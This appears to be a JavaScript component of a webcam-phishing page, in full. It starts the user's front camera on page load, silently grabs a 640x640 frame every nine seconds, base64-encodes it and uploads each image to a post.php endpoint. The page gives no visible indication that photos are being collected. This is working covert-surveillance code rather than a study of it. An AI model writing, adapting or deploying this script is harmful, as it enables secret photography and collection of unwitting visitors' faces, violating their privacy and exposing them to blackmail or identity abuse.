'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {
    facingMode: "user"
  }
};

function post(imgdata) {
  $.ajax({
    type: 'POST',
    data: { cat: imgdata },
    url: 'post.php',
    dataType: 'json',
    async: false,
    success: function (result) {
      // manejar la respuesta
    },
    error: function () {
      // manejar el error
    }
  });
}

async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    if (errorMsgElement) {
      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
    }
  }
}

function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

  var context = canvas.getContext('2d');
  setInterval(function () {
    context.drawImage(video, 0, 0, 640, 640);
    var canvasData = canvas.toDataURL("image/png");
    cc = String(canvasData).replace("data:image/png;base64,", "");
    post(cc);
  }, 9000);
}

// Autoejecutar cámara
init();
